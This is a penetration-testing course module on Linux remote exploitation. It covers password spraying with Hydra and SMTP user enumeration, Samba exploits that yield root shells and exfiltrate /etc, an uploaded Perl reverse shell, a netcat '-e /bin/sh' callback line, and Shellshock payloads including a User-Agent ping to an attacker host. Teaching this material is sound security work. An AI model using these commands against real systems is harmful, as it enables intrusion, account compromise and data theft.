# [ECPPT](https://members.elearnsecurity.com/courses/penetration_testing_professional_v5)
__________________________
# Linux Exploitation
# Module 3 - Remote Exploitation

https://cdn.members.elearnsecurity.com/ptp_v5/section_4/module_3/html/index.html

###### Module Map
1. Password Spray Attack
2. Exploiting Samba
3. Exploiting Shellshock
4. Exploiting Heartbleed
5. Exploiting Java RMI Registry
6. Exploiting Java Deserialization
7. Exploiting Tomcat
8. Remote Exploitation - Conclusion

___________________________________
## 3.1. Password Spray Attack
Password Spray Attacks have quickly gained popularity as a *go-to* method for gaining access to systems via dictionary attacks due to its success-rate in the wild.

Rather than the usual dictionary brute force methods involving a dictionary of hundred of not millions of password entries, the idea is to reverse the process, and instead, introduce a list of as many *users* as possible, while trying just a *single password attempt* against tens or hundreds of user accounts.

This method reduces the potential of account lockouts and in some cases, allow us to stay *under the radar* when attempting single passwords against many users.

This method may also see referred to as [Reverse Brute-Force Attack](https://en.wikipedia.org/wiki/Brute-force_attack#Reverse_brute-force_attack)

To successfully execute a password spray attack, we must first gather as many usernames as possible in regard to our target organization or target system.
  This can be done in several ways, as we've  seen in the information gathering and enumeration sections.

  For this module, we'll use the SMTP method of enumerating users in addition to utilizing [Statistically Likely Usernames](https://github.com/insidetrust/statistically-likely-usernames) lists in order to compile an initial list of users, along with any usernames we have already gathered from other phases of engagement.

  Also, remember that we can use tools such as [The Harvester](https://github.com/laramies/theHarvester) to get an idea of user naming conventions organizations are using for their users.

  Utilizing more than one tool to help compile an initial user list will only help us in our quest.

In the information gathering phase, we saw that there are several tools and services which we can use to accomplish our user enumeration tasks. For enumerating SMTP users, we covered [smtp-user-enum](http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum) and also several manual methods (VRFY, EXPN, etc).

Metasploit also contains an auxiliary scanner module known as [smtp_enum](https://www.rapid7.com/db/modules/auxiliary/scanner/smtp/smtp_enum) which we'll use for this purpose this time around.

  First, we'll need to create our initial user list. We can quickly create a list of fifty users with the following command, where `john.txt` is taken directly from the [Statistically Likely Usernames](https://github.com/insidetrust/statistically-likely-usernames) list:
    ```
    head -n 50 john.txt >> users.txt
    ```
    ```
    root@tester:~/tools# cat users.txt
    bob
    root
    sara
    john
    michael
    david
    chris
    mike
    james
    mark
    jason
    <...snip>
    ```

  Once we've created our initial list of users, combined with users we've gathered from other phases of testing, we can execute our enumeration process using the Metasploit [smtp_enum](https://www.rapid7.com/db/modules/auxiliary/scanner/smtp/smtp_enum) module against our target SMTP server:
    ```
    msf > use auxiliary/scanner/smtp/smtp_enum
    ```

    We'll then set our `RHOST` value to that of the SMTP server IP address, and also set the `USER_FILE` value to that of our `users.txt` file and run the module:
      ```
      msf auxiliary(scanner/smtp/smtp_enum) > set RHOST 192.168.13.21
      RHOSTS => 192.168.13.21
      msf auxiliary(scanner/smtp/smtp_enum) > set USER_FILE users.txt
      USER_FILE -> users.txt
      msf auxiliary(scanner/smtp/smtp_enum) > run

      [*] 192.168.13.21:25 - 192.168.13.21:25 Banner: server2 ESMTP Sendmail 8.15.2/8.15.2/Debian-9;
      Fri, 12 Jan 2018 16:33:31 -0500; (No UCE/UBE) logging access from: tester.localdomain(OK)-tester.localdomain [192.168.13.18]
      ```

    When the scanner completes (which may take several minutes depending on how many users are in our list), we can see that we've validated several users that we can use for our password spray attack:
      ```
      [+] 192.168.13.21:25      - 192.168.13.21:25 Users found: amanda, bob, brian, chris, david, james, jason, jeff, jennifer, jessica, michael, robert, sara
      ```

    From the output above, we can now create a list of validated users.
    Add those to your `valid_users.txt` file, (one on each line) with any others you may have validated during information gathering.

    Note:<br>
      The more users we can validate, the higher probability that our password spray attack will succeed; so aim to create as large a list as possible, of validated users accounts.

  Now that we have validated some users, we should determine one (recommended) or two (max) commonly-used passwords we can use for our attack.
    Regarding commonly used passwords, real-world experience has shown that one of the most commonly used passwords are usually found to be the current season, along with the current year, e.g., `Spring2018`

      You'll be surprised at how many times you will come across multiple users, within the same environment, using the same exact password in the `Season[Year]` format.

      Use this lack of configuration of password complexity and human nature to choose easy-to-remember passwords to your advantage.

      Another very common password is `CompanyName[Number]`, e.g., FooCorp01, FooCorp02, etc.

    For our password list, we'll start with just using `Spring2018` as it's very common.
      Use your imagination when picking a password that related to your target in some way or another.

      In environments where password complexity is not enabled, (a common observation in Linux-based networks), users will take advantage of using easy-to-remember password that they'll modify by simply changing a value or other characteristic over time, e.g., *Password01* to *Password02* or *Summer2018* to *Fall2018*.

      From month to month, season to season, making minor modifications to their passwords, will be enough to please the systems' password policy.

      Also, keep in mind that password re-use is also a frequent issue, and passwords may be reused across systems within an environment.

  Now that we have a list of users we've validated, and a list containing 2 very common passwords, we can start our password spray attack against other services on our target machine.
     First, let's determine some other services that are listening on our target system that we can execute a password spray attack against.

     We'll use Nmap for that:
      ```
      nmap -sT 192.168.13.21 --open --max-retries 1 -n
      ```
      ```
      Nmap scan report for 192.168.13.21
      Host is up (0.00075s latency).
      Not shown: 992 closed ports
      PORT      STATE   SERVICE
      22/tcp    open    ssh
      25/tcp    open    smtp
      80/tcp    open    http
      111/tcp   open    rpcbind
      139/tcp   open    netbios-ssn
      445/tcp   open    microsoft-ds
      587/tcp   open    submission
      2049/tcp  open    nfs
      MAC Address: 00:0C:29:37:8B:DB (VMWare)

      Nmap done: 1 IP_address (1 host up) scanned in 0.34 seconds
      ```

      From the output, we can determine that there are several services we can execute our password spray attack against; SSH, SMTP, and SMB, as they all utilize some form of authentication or another.

      For this lesson, we'll pick SSH, just to demonstrate that we can use one particular service, in this case, SMTP, to enumerate for valid users that we can then use to attack an unrelated service, SSH in this case.

      To summarize our activities up to this point:
      1. We've created a list of users gathered through our information gathering phase, in addition to using usernames form the Statistically Likely Usernames list
      2. We've confirmed valid users using SMTP users enumeration with the `smtp_enum` Metasploit scanner module
      3. We've created our list of validated user accounts, and a list containing 2 commonly-used passwords
      4. We've determined several services on our target machine we can execute our password spray attack against and have decided on SSH

  Now that all of those pieces are in place, we can execute password spray attack against the SSH service.
    For this, we'll use [THC-Hydra](https://github.com/vanhauser-thc/thc-hydra), a well-known and tested brute-force tool.

    With Hydra, we can supply our list of users (`-L`), our password list (`-P`), and specify the service we'd like to attack (`ssh`), with a command line similar too the following:
      ```
      hydra -L users.txt -P passwords.txt ssh://192.168.13.21
      ```
      ```
      Hydra v8.6 (c) 2017 van Heuer/THC - Please do not use in military or secret service organizations, or for illegal purposes.

      [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
      [DATA] max 16 tasks per 1 server, overall 16 tasks, 22 login tries (1:11/p:2), ~2 per task
      [DATA] attacking ssh://192.168.13.21:22/
      [22][ssh] host: 192.168.13.21 login: david    password: Spring2018
      1 of 1 target successfully compleetd, 1 valid pasword found
      ```

      From the Hydra output above, we can see we successfully cracked the `david` account with the `Spring2018` password.

  Once we've obtained valid credentials for a single user, we can also exploit the common case of *password reuse* within an environment.
    Using the obtained credentials, we can then use those to attempt to log in to other SSH-enabled machines as our `david` user.

    This often results in access to multiple systems which can then be used as pivots to other areas of the network or to maintain multiple footholds, etc.

    Of course, this can also be done with Hydra, and in a single sweep, we can determine other systems on the network, which allow access using the same credentials we've cracked. We would use the `-M` parameter to specify a list of ssh servers. Something like the following:
      ```
      hydra -l david -p Spring2018 -M ssh_servers.txt ssh
      ```
      Where `ssh_servers.txt` is a file containing your SSH target servers, one per line.

In addition to trying your password spray attack against the SSH service, we encourage you to also experiment with brute forcing SMB, or any other listening services that accept user credentials if found as well.
  Metasploit [smb_login](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_login) scanner module can be used to obtain similar results for password spray attacks against SMB services.

Aside from targeting Linux-based systems with password spray attacks, the same concept is, of course, valid for any type of environment or platform, as long as the service provides a means to authenticate to it.

With that said, password spray attacks are also known to be very successful against platforms such as Outlook Web Access or Exchange Portals.
  We encourage you to try this attack using Metasploit's [owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login) brute force module on OWA portals you are authorized to test against for great results using the Password Spray method.

**A Word of Caution**
Depending on system configurations, Password Spray attacks can be detected and thwarted, which is why it is crucial to only attempt 1 or 2 passwords during a single run.

Take extra care that whichever tool you're using isn't trying blank passwords or other variations in addition to whatever is in you password list.

This would add to the authentication attempts and likely result in account lockouts, or detection by a SIEM or other anomalous event detection solution.

Furthermore, after attempting a password spray attack run, if unsuccessful the first time around, wait 45 minutes and try again with new passwords in your list.

Multiple attempts within a certain time-range can also result in detection and/or lockouts.


___________________________________
## 3.2. Exploiting Samba
[Samba](https://en.wikipedia.org/wiki/Samba_(software)), as encountered previously in Information Gathering, is quite commonly found within Linux-based environments, as it typically provides file sharing services to both Windows, and Linux users.

It is also a ripe target when configured incorrectly, and versions up to 4.6.4. contain vulnerabilities that allow an attacker to take control of an affected server completely, this was most recently seen with [CVE-2017-7494](http://cve.circl.lu/cve/CVE-2017-7494), sometimes referred to as *SambaCry*.

For this portion of the lesson, we are going to focus on three different attack vectors affecting different versions and of varying configurations of Samba, and on different systems.

It will be important that we identify the exact versions of Samba, as well as identify vulnerabilities that exist in either the versions or configurations, and then exploitation of the systems.

Steps:
  The first task requires identifying that Samba is installed on the system, and furthermore, identifying the version of Samba.
    This can be accomplished with a nmap [smb-os-discovery](https://nmap.org/nsedoc/scripts/smb-os-discovery.html) script scan for port 445:
      ```
      nmap --script smb-os-discovery -p445 192.168.13.29
      ```
      ```
      Nmap scan report for server3 (192.168.13.29)
      Host is up (0.00048s latency).

      PORT      STATE   SERVICE
      445/tcp   open    microsoft-ds
      MAC Address: 00:0C:29:ED:4B:92 (VMWare)

      Host script results:
      | smb-os-discovery:
      |   OS: Unix (Samba 3.0.20-Debian)
      |   NETBIOS computer name:
      |   Workgroupu: WORKGROUP\x00
      |_  System time: 2018-01-19T20:59:15-05:00

      Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
      ```
      As we can see from the above scan output, we've identified a Samba version of *3.0.20*

  Once the version of Samba is known, we can start to investigate exactly which vulnerabilities might be present for that particular version.
    [searchsploit](https://www.exploit-db.com/searchsploit/) is an excellent tool for this, and allows us to search all vulnerabilities for a particular software directly from the Linux command line.
      Searchsploit is a local database of all exploits that can also be found at http://www.exploit-db.com/

      Knowing that the Samba version we are looking for is 3.0.20, we can execute the following `searchsploit` command, to find vulnerabilities related to it:
        ```
        # searchsploit samba 3.0.20
        ```
        ```
        root@tester:~# searchsploit samba 3.0.20
        -------------------------------------------------------------------
          Exploit Title

        -------------------------------------------------------------------
        Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
        Samba < 3.0.20 - Remote Heap Overflow
        ```

        From our `searchsploit` results, we can see that we have a potential vulnerability candidate (Username map script Command Execution), and additionally, the (Metasploit) indicator tells us that there is a Metasploit module for it as well. Let's see if we can exploit it.

#### 3.2.1 The Username Map Script vulnerability (CVE-2007-2447)
      The [Username Map Script](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script) vulnerability ([CVE-2007-2447](https://www.samba.org/samba/security/CVE-2007-2447.html)), discovered in 2007 by an anonymous researcher, affects Samba versions `3.0.0` through `3.0.25rc3` and exists in non-default configurations where the *username map script* option is enabled, which results in remote command execution and compromise of the affected server. More in [here](https://www.samba.org/samba/security/CVE-2007-2447.html).

      Exploiting the [Username Map Script]() is rather straightforward, only requiring a couple of options in the Metasploit module configuration.
        First, we load the exploit module
          ```
          msf> use exploit/multi/samba/usermap_script
          ```
        Then we set our `RHOST` value for our target
          ```
          msf exploit(multi/samba/username_script) > set RHOST 192.168.13.29
          ```
        Then our `LHOST` value for our attacker machine, where the exploit will call back to:
          ```
          msf exploit(multi/samba/username_script) > set LHOST 192.168.13.18
          ```
        Finally, we should be able to run our exploit
          ```
          msf exploit(multi/samba/usermap_script) > exploit

          [*] Started reverse TCP double handler on 192.168.13.18:4444
          [*] Accepted the first client connection...
          [*] Accepted the second client connection...
          [*] Command: echo Ico6BGCor4gLjPhR;
          [*] Writing to Socket A
          [*] Writing to Socket B
          [*] B: "Ico6BGCor4gLjPhR\r\n";
          [*] Matching...
          [*] A is input...
          [*] Command shell session 2 opened (192.168.13.18:4444 -> 192.168.13.29:37702)
          ```
        Once the exploit is completed, and we have a Command Shell session, we can immediately start interacting with it, and executing commands:
          ```
          [*] Command shell session 3 opened (192.168.13.18:4444 -> 192.168.13.29:47822) at

          id
          uid=0(root) gid=0(root)
          uname -a
          Linux server3 2.6.24-16-server #1 SMP Thu Apr 16:58:00 UTC 2008 i686 GNU/Linux
          ```

          In this particular instance, we are UID 0 (root), and therefore have full control over the system. The next logical progression would be to start post-exploitation tasks, which will be covered in detail in later modules.

          Something you may have noticed once we got our shell, is that we are not presented with an interactive `/bin/sh` prompt, e.g., (`sh-3.2#`).
            We can remedy this by launching a simple Python one-liner to give us a proper PTY (Pseudo TTY):
              ```
              python -c 'import pty; pty.spawn("/bin/sh")'
              ```
            As you can see, once we run our python `pty.spawn` one-liner, we are presented with a `/bin/sh` prompt.

#### 3.2.2. Samba Symlink Directory Traversal
Another vulnerability which is a result of a particular misconfiguration in Samba, but sometimes catastrophic consequences is known as the [Samba Symlink Directory Traversal](https://www.samba.org/samba/news/symlink_attack.html) vulnerability.

The vulnerability essentially allows an attacker to create a symbolic link to the root (/) partition from a writeable share ultimately allowing for read access to the entire file system outside of the share directory.

Although this vulnerability can be exploited using a modified `smbclient`, Metasploit contains a [module](https://www.rapid7.com/db/modules/auxiliary/admin/smb/samba_symlink_traversal) for exploitation, so we'll use that for our purposes.

  A pre-requisite to this particular vulnerability requires that the samba server contains a writeable share and that the `widelinks` parameter in the `smb.conf` file is set with a value of `yes`. We can use the following `smbmap` command to dtermine shares available to us on a Samba server
    ```
    smbmap -H 192.168.13.29
    ```
    ```
    [+] Finding open SMB ports...
    [+] User SMB session established on 192.168.13.29...
    [+] IP: 192.168.13.29:445       Name: server3

            Disk                                Permissions
            ----                                -----------
            print$                              NO ACCESS
            tmp                                 READ, WRITE
            opt                                 NO ACCESS
            IPC$                                NO ACCESS
            ADMIN$                              NO ACCESS
    ```
    Description : `tmp` share's WRITE access identified

  Once we have determined that a writeable share is available, in this case `tmp`, we can use Metasploit's [samba_symlink_traversal](https://www.rapid7.com/db/modules/auxiliary/admin/smb/samba_symlink_traversal) auxiliary module to create the symlink to the root filesystem
    Several options are required as seen below:
    ```
    msf auxiliary(admin/smb/samba_symlink_traversal) > show options

    Module options (auxiliary/admin/smb/samba_symlink_traversal):

      Name      Current Setting   Required   Description
      ----      ---------------   --------   -----------
      RHOST     192.168.13.29     yes        The target address
      RPORT     445               yes        The SMB service port (TCP)
      SMBSHARE  tmp               yes        The name of writeable share on the server
      SMBTARGET rootfs            yes        The name of the directory that should point to the root filesystem
    ```

    As seen in the above screenshot, we set out `RHOST` value to that of our target server, we can leave the `RPORT` as-is, and we also need to specify the name of the writeable share, which is `tmp` in this instance. We can also leave the `SMBTARGET` set to its default.

    Once this is complete, we can run our module.
      ```
      msf auxiliary(admin/smb/samba_symlink_traversal) > run
      [+] 192.168.1.29:445 - Connecting to the server...
      [+] 192.168.1.29:445 - Trying to mount a writeable share 'tmp'...
      [+] 192.168.1.29:445 - Trying to link 'rootfs' to the root filesystem...
      [+] 192.168.1.29:445 - Now access the following share to browse the root filesystem:
      [+] 192.168.1.29:445 -        \\192.168.13.29\tmp\rootfs

      [+] Auxiliary module execution completed
      ```

      We can see from the above output, that a new `rootfs` directory has been created within the `tmp` share.

    Our next step is to use `smbclient`, as we have seen from previous sections, to access the share, change into the `rootfs` directory, and download or upload files to the system where and if possible.
      We can do this with the following command:
      ```
      smbclient \\\\192.168.13.29\\tmp -N
      ```
      ```
      WARNING: The "syslog" option is deprecated
      Anonymous login successful
      Try "help" to get a list of possible commands.
      smb: \> ls
        .                 D       0   Sat Jan 20 08:37:48 2018
        ..                DR      0   Mon Jan 15 20:29:56 2018
        .ICE-unix         DH      0   Sat Jan 20 06:51:38 2018
        .X11-unix         DH      0   Sat Jan 20 06:52:03 2018
        -X8-lock          DR     11   Sat Jan 20 06:52:03 2018
        5163.jsvc_up      R       0   Sat Jan 20 06:52:19 2018
        rootfs            DR      0   Mon Jan 15 20:29:56 2018
      smb: \>
      ```

    From here, we can simply use `smbclient` to change into the `rootfs` directory, and begin post exploitation, downloading/uploading files, etc. using the `smbclient` `get` and `put` commands:
      ```
      smb: \> cd rootfs
      smb: \rootfs\> cd etc
      smb: \rootfs\etc\> get passwd
      getting file \rootfs\etc\passwd of size 1612 as passwd
      1574.2 KiloBytes/sec)
      smb: \rootfs\etc\>
      ```
      `\rootfs\etc\passwd` is saved as `passwd` in your PC

      ```
      root@tester:~# less passwd
      ```
      ```
      root:x:0:0:root:/root:/bin/bash
      daemon:x:1:1:daemon:/usr/sbin:/bin/sh
      bin:x:2:2:bin:/bin:/bin/sh
      ...
      ```

      Additionally, another useful command for data exfiltration when conducting post-exploitation tasks using `smbclient` is the `tar` command.
        With the `tar` command, we can create an archive of all files within a current directory, for local use later.
          ```
          smb: \rootfs\tmp\rootfs\> cd etc
          smb: \rootfs\tmp\rootfs\etc\> tar c ../tmp/all_files.tar *
          ```
        The above will create a tar archieve of the `/etc/` directory on the target system to our local systems' `/tmp` directory
          ```
          root@tester:/tmp# ls -als all_files.tar
          34904 -rw-r--r-- 1 root root 35738624 Jan 12 14:22 all_files.tar
          ```
        We can then extract, and start enumerating files for sensitive content, passwords, etc
          ```
          root@tester# tar xf /tmp/all_files.tar
          root@tester# cd /tmp/rootfs/tmp/rootfs/etc
          root@tester# grep -r "password" * 2>&1 /dev/null
          ```
          ```
          php2/apache2/php.ini:; file will be able to reveal password as well
          php2/apache2/php.ini:;mysql.default password = My!SQLP@ssw0rd!
          php2/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)
          ```
        We will cover post-exploitation tasks such as the above in greater detail in the later module.

#### 3.2.3. Writeable samba Share to Remote Command Execution via Perl Reverse Shell
Now what we have seen how we can exploit known vulnerabilities in either configuration issues, or vulnerable versions of samba.

This final segment on Samba Exploitation will cover what we can do in certain situations where we have a fully patched Samba server, but have a writeable share available to us, and can exploit that scenario for remote command execution, in this case, a reverse shell.

In this scenario, we discover that a server we have enumerated is running a patched Samba server, and contains a share named `www`, which appears to be possibly configured to allow administrators to easily update an internal web application.

Using our previous checks for Samba version and available shares using the Nmap [smb-os-discovery](https://nmap.org/nsedoc/scripts/smb-os-discovery.html) NSE script, and [smbmap](https://github.com/ShawnDEvans/smbmap), we have determined OS and Samba Version:
  ```
  nmap --script smb-os-discovery 192.168.13.21 -p 445
  ```
  ```
  Nmap scan report for server3 (192.168.13.29)
  Host is up (0.00046s latency).

  PORT      STATE   SERVICE
  445/tcp   open    microsoft-ds
  MAC Address: 00:0C:29:37:8B:DB (VMWare)

  Host script results:
  | smb-os-discovery:
  |   OS: Windows 6.1 (Samba 4.7.3-Debian)
  |   Computer name: server2
  |   NETBIOS computer name: SAMBASRV\x00
  |   Domain name: \x00
  |   FQDN: server2
  |_  System time: 2018-01-20T16:53:31-05:00
  ```

We also have determined any shares that are available to us, as well as seeing that Guest sessions to the shares are possible as well:
  ```
  smbmap -H 192.168.13.21
  ```
  ```
  root@tester:~# smbmap -H 192.168.13.21
  [+] Finding open SMB ports....
  [+] Guest SMB session established on 192.168.13.21...
  [+] IP: 192.168.13.21:445     Name: server2
          Disk                                                Permissions
          ----                                                -----------
          www                                                 READ, WRITE
          print$                                              NO ACCESS
          IPC$                                                NO ACCESS
  ```
  Description: `www` is shared with `READ` and `WRITE` access

This finding is good news for us for a couple of reasons:
1. Web roots often contain files specific to a web server configuration, and can furthermore be used to obtain credentials tot other services, e.g., MySQL
2. Being able to *write* to a web root, is even better depending on the web server configuration.
  For example:
  - Is PHP installed?
  - Are there any other web server-interpreted languages we can use to our advantage?
  - Can we upload any files to this directory, and how will the web server handle our files?
  - Can we exploit that to obtain remote command execution?

Our first task is to connect to the share, and have a look at its content, and secondly, we'll want to determine if the Samba server has any HTTP ports listening, which might be serving contents to share.
  Again, we'll use `smbclient` to connect and have a look at any files within the `www` share. We can connect to the share with `smbclient` and execute the Linux `ls` command to list files within the directory
    ```
    root@tester:~# smbclient \\\\192.168.13.21\\www -N
    WARNING: The "syslog" option is deprecated
    Try "help" command to get a list of possible commands.
    smb: \> ls
      .                 D       0   Sat Jan 20 08:37:48 2018
      ..                DR      0   Mon Jan 15 20:29:56 2018
      index.pl          D       0   Sat Jan 20 08:37:48 2018

    smb: \>
    ```
    As the image above explains, the presence of a `.pl` extension indicates that the server is likely configured to process Perl (CGI) programs.

  We can download the `index.pl` file with the `get` command, and take a look at its contents; perhaps we can gain some insight as to its purpose or function
    ```
    smb: \> get index.pl
    getting file \index.pl of size 283 as index.pl (2.6 KiloBytes/sec) (average 2.6 KiloBytes/sec)
    smb: \>
    ```

    Looking at the file, we can determine that `index.pl` is a script that simply prints some environment variables regarding the web server configuration as well as confirming that the server is also interpreting Perl scripts.
      ```
      #!/usr/bin/perl

      print "Content-type:text/html\n\n";
      print <<EndOfHTML;
      <html><head><title>Perl Environment Variables</title></head>
      <body>
      <h1>Perl Environment Variables</h1>
      EndOfHTML

      for each $key (sort(keys %ENV)) {
        print "$key = $ENV{$key}<br>\n";
      }

      print "</body></html>"
      ```

We now know it's likely configures to process CGI scripts (Perl), but just to make sure, let's attempt to browse the HTTP port (which we should have discovered about this server during information gathering and enumeration).
  Just to confirm, a quick Nmap scan against the target for open ports, confirms that port 80 is in-fact open:
    ```
    nmap -sT 192.168.13.21 --max-retries 1 -n --open
    ```
    ```
    Nmap scan report for 192.168.13.21
    Host is up (0.00068s latency)
    Not shown: 992 closed ports
    PORT      STATE SERVICE
    22/tcp    open  ssh
    25/tcp    open  smtp
    80/tcp    open  http
    111/tcp   open  rpcbind
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    587/tcp   open  submission
    2049/tcp  open  nfs
    MAC Address: 00:0C:29:37:8B:DB (VMWare)
    ```

  Let's point a browser at our target, to confirm that `index.pl` script in `www` share, is being served by the web server.

We have confirmed that the `www` share configured on the Samba server, is most likely being used to serve the `index.pl` script and is likely the actual web root for the web server.

We also want to make sure that we do in-fat have WRITE permissions to the `www` share; again, we'll do this with `smbclient`, and the `put` command.
  First, let's create a file locally on your attacker system called `test.pl`.
    The contents of this file will execute the `id` Linux system command and will display your current UID and GID information when accessed with your browser.
      **test.pl**
      ```
      #!/usr/bin/perl

      print "Content-type: text/html\n\n"
      system("id");
      ```
  Next, let's connect to the `www` share with `smbclient` and issue the `put` command, along with our `test.pl` file:
    ```
    root@tester:~# smbclient \\\\192.168.13.21\\www -N
    WARNING: The "syslog" option is deprecated
    Try "help" command to get a list of possible commands.
    smb: \> put test.pl
    putting file test.pl as \test.pl (28.3 kb/s) (average 28.3 kb/s)
    smb: \>
    ```
    That was a success. We've confirmed we can upload files to the `www` share.

  Next, let's point a browser to our `test.pl` file on the target system and confirm that the output of the `id` command is printed on the page.
    This will confirm for us that we can upload our own Perl scripts to the server and can execute remote OS commands through our test script (see img-78)

    If all goes well, and we see something similar to the above, we can move onto exploiting the target to obtain a reverse shell.

From this point, we can utilize some tools that have already been written to get us a reverse shell on the system.
  We are going to use a well-known reverse shell Perl script known as [perl-reverse-shell.pl](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell) and can be downloaded from [here](http://pentestmonkey.net/tools/perl-reverse-shell/perl-reverse-shell-1.0.tar.gz)

  If you are using Kali Linux, the script can also be found in the `/usr/share/webshells/perl` directory.

  The script itself will require some minor modifications before we can use it.
  Let's take a quick look at the script, and make sure we are modifying the correct options for our current working environment, especially, our attacker machine IP address, and the port we are going to use for a `netcat` listener to accept the connection.

  We can see on lines `45` and `46`, where we need to make sure that the `$ip` variable set to our attacker machine IP address, and we can choose a port for our `netcat` listener as well. We'll stick with port `1234` for our listener.
    ```
    38 use strict;
    39 use Socket;
    40 use FileHandle;
    41 uses POSIX;
    42 my $VERSION = "1.0";
    43
    44 # Where to send the reverse shell, change these.
    45 my $ip = 192.168.13.18';
    46 my $port = 1234;
    47
    48 # Options
    49 my $daemon = 1;
    50 my $auth = 0; # 0 means authentication is disabled and any
    51               # source IP can access the reverse shell
    52 my $authorized_client_pattern = qr(^127\.0\.0\.1$);
    53
    ```

  Once we've modified the reverse shell Perl script to reflect our attacker IP, we can upload it to the target, the same way we uploaded out `test.pl` file, with `smbclient` and `put`:
    ```
    smb: \> put perl-reverse-shell.pl
    putting file perl-reverse-shell.pl as \perl-reverse-shell.pl
     (1209.6 kb/s) (average 10.1 kb/s)
    smb: \>
    ```
  Before we move forward, first we need to make sure we have our `netcat` up and ready to receive a connection from the target machine.
    `Netcat` can quickly configured to accept remote connections from target systems and provide us with interactive shells relatively quickly.

    It also has other uses, such as transferring files and data exfiltration.

    `Netcat` will also be discussed in more detail in the Post-exploitation modules, but let's continue to our current task.

    To summarize our activities so far, we've:
    1. Uploaded a `test.pl` file to the `www` share and have confirmed we can upload and execute our own Perl scripts on the web server
    2. We've modified the `perl-reverse-shell.pl` script to include our attacker machine IP address, and a port which our `netcat` listener will be configured on and have uploaded it to our target via the `www` share
    3. Next, let's quickly bring up `netcat` listener on our attacker system

    Setting up a `netcat` listener on a specific port is as simple as executing the following command on your attacker system:
      ```
      nc -n -l -v -p 1234
      ```
      At which point, you should see output similar to the following:
      ```
      root@tester:~# nc -nlvp 1234
      listening on [any] 1234 ...
      ```

      Description: (can be combined into `-nlvp`)
      - `-n` : no dns
      - `-l` : listen mode
      - `-v` : verbose
      - `-p` : port we want to listen on (1234)

  Now that we have our `netcat` listener up and ready to accept the incoming connection from our target system, all we need to do next is simply access the reverse shell Perl script we uploaded from a browser on our attacker machine.
    Upon doing that, our `netcat` listener should receive the connection, at which point, we will have a shell on the target.

    Let's try it. (see img-89)

  Alternatively, since we earlier confirmed that the system would execute the `id` command from our `test.pl` script, we could similarly change our script to run a `netcat` reverse shell of we wanted to.
    Our reverse shell Perl script could look similar to the following, and still serve up a bash shell to our `netcat` listener:
      ```
      #!/use/bin/perl

      print "Content-type: text/html\n\n";
      system("nc 192.168.13.18 1234 -e /bin/sh");
      ```
      Description:
      - `-e /bin/sh` to push a shell from the target to our netcat listener

    This demonstrated that there is usually more than one way to achieve our objectives.

Of course, the real work only begins once we have access to a machine, whether it's through a remote exploit, a reverse shell, etc.

Later sections of this course will focus on the steps we can take once we have a shell, maintaining our access through persistence mechanisms, exfiltrating data, moving laterally through an environment, and more.

___________________________________
## 3.3. Exploiting Shellshock
[Shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)) or *Bashdoor*, disclosed on 24 September 2014, yet another vulnerability that shook the information security industry.

  Within hours of its release, thousands of devices and systems had already been compromised, and botnets were created for the purpose of its exploitation en masse.

  The vulnerability was discovered in the [Unix Bash Shell](https://en.wikipedia.org/wiki/Bash_(Unix_shell)), and affected CGI programs on web servers, OpenSSH, DHCP Clients, and several other attack vectors, e.g., Qmail mail servers, etc.

  The discovery of Shellshock resulted in several CVE's being assigned to different attack vectors:
  - [CVE-2014-6271][https://en.wikipedia.org/wiki/Shellshock_(software_bug)#Initial_report_(CVE-2014-6271)]
  - [CVE-2014-6277][https://en.wikipedia.org/wiki/Shellshock_(software_bug)#CVE-2014-6277]
  - [CVE-2014-6278][https://en.wikipedia.org/wiki/Shellshock_(software_bug)#CVE-2014-6278]
  - [CVE-2014-7169][https://en.wikipedia.org/wiki/Shellshock_(software_bug)#CVE-2014-7169]
  - [CVE-2014-7186][https://en.wikipedia.org/wiki/Shellshock_(software_bug)#CVE-2014-7186]
  - [CVE-2014-7187][https://en.wikipedia.org/wiki/Shellshock_(software_bug)#CVE-2014-7187]

  We encourage you to do additional research regarding the above CVE's, to get a greater understanding of the severity of Shellshock, and the possibilities for exploiting it.

For the purpose of this course, we are going to focus on the CGI attack vector.

To start understanding Shelllshock, let's take a look at one method that was released in order to determine if a system was vulnerable, from a local perspective.
  We can take the following as an example, as it relates directly to the initial CVE that was assigned ([CVE-2014-6271][https://en.wikipedia.org/wiki/Shellshock_(software_bug)#Initial_report_(CVE-2014-6271)]):
    ```
    env x='() { :;}; echo vulnerable' bash -c "echo this is a test";
    ```

  When executed on a vulnerable system, the shell would echo `vulnerable`, as seen below:
    ```
    elsadmin@server3:~$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test";
    vulnerable
    this is a test
    elsadmin@server3:~$
    ```

  As an example, let's break down the following shellshock string:
    ```
    env x='() { :;}; echo vulnerable' bash -c "echo this is a test";
    ```
    Description:
    - When executed in a vulnerable bash shell, the string essentially executes an environment called `x`
    - `x` in turn runs the `echo vulnerable` command, which is outside the environment variable function
      - i.e. outside the "() { :;};" part of the string

    This was not intended as part of the design of how bash should handle environment variables.
    On a patched system, the correct output of the above string would simply be `this is a test`, as seen below
      ```
      elsadmin@server3:~$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test";
      this is a test
      elsadmin@server3:~$
      ```

  One of the primary attack vectors that was seen in the wild following the disclosure of Shellshock was the modification of `User-Agnet` strings to include Shellshock payloads intended to run commands on the remote server.
    One example of this thaw was seen in-the-wild, was a *recon test* which would confirm to an attacker that a particular system was vulnerable.

    This was accomplished by modifying a sent *User-Agent* string to include *ping* command destined for the attacker's machine along with a unique payload.

    If the attacker receives the unique payload string, then this serves as a confirmation that the system ran the *ping* command.

    The attacker could then tie it back to a specific vulnerable system for further exploitation later.

    The *User-Agent* string for that test would have been something like the following:
      ```
      User-Agent: () { :;}; ping -c 5 -p unique_string attacker.machine
      ```

Now that we've covered a little bit of the history of Shellshock and some basic about its exploitation, we can start applying our knowledge to an actual scenario.
